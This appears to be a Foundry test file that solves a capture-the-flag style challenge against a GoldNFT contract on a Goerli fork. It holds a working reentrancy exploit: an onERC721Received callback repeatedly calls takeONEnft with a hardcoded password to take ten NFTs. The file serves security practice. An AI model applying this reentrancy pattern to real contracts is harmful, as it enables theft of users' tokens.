// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

contract Hack1 is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("<goerli_url>", 8591866);
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        // solution
        nftHack = new HackGoldNft(hacker, address(nft));
        nftHack.kickOff();

        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft {
    uint256 count;
    address owner;
    GoldNFT goldNFT;

    constructor(address _owner, address _goldNFT) {
        owner = _owner;
        goldNFT = GoldNFT(_goldNFT);
    }

    function kickOff() external {
        goldNFT.takeONEnft(
            bytes32(
                0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe
            )
        );
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (count < 10) {
            count++;
            goldNFT.takeONEnft(
                bytes32(
                    0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe
                )
            );
            goldNFT.transferFrom(address(this), owner, count--);
        }
        return 0x150b7a02;
    }
}
